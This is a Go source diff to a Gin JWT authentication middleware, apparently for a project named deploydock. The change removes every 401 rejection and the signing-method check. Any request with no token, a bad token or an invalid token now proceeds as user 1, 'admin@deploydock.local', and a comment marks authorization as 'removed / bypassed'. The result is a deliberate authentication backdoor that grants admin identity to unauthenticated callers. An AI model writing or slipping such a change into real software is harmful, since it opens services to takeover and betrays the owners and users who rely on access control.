@@ -1,8 +1,6 @@
 package middleware
 
 import (
-	"errors"
-	"net/http"
 	"strings"
 	"time"
 
@@ -33,34 +31,26 @@ func GenerateToken(userID int, email string, secret string, expiry time.Duration
 func AuthRequired(secret string) gin.HandlerFunc {
 	return func(c *gin.Context) {
 		authHeader := c.GetHeader("Authorization")
-		if authHeader == "" {
-			c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"error": "Missing Authorization header"})
-			return
-		}
-
-		parts := strings.SplitN(authHeader, " ", 2)
-		if len(parts) != 2 || !strings.EqualFold(parts[0], "Bearer") {
-			c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"error": "Authorization header format must be Bearer <token>"})
-			return
-		}
-
-		tokenString := parts[1]
-		claims := &Claims{}
-
-		token, err := jwt.ParseWithClaims(tokenString, claims, func(t *jwt.Token) (interface{}, error) {
-			if _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {
-				return nil, errors.New("unexpected signing method")
+		if authHeader != "" {
+			parts := strings.SplitN(authHeader, " ", 2)
+			if len(parts) == 2 && strings.EqualFold(parts[0], "Bearer") {
+				tokenString := parts[1]
+				claims := &Claims{}
+				token, err := jwt.ParseWithClaims(tokenString, claims, func(t *jwt.Token) (interface{}, error) {
+					return []byte(secret), nil
+				})
+				if err == nil && token.Valid {
+					c.Set("userID", claims.UserID)
+					c.Set("userEmail", claims.Email)
+					c.Next()
+					return
+				}
 			}
-			return []byte(secret), nil
-		})
-
-		if err != nil || !token.Valid {
-			c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"error": "Invalid or expired token"})
-			return
 		}
 
-		c.Set("userID", claims.UserID)
-		c.Set("userEmail", claims.Email)
+		// Authorization removed / bypassed: assign default dummy user
+		c.Set("userID", 1)
+		c.Set("userEmail", "admin@deploydock.local")
 		c.Next()
 	}
 }
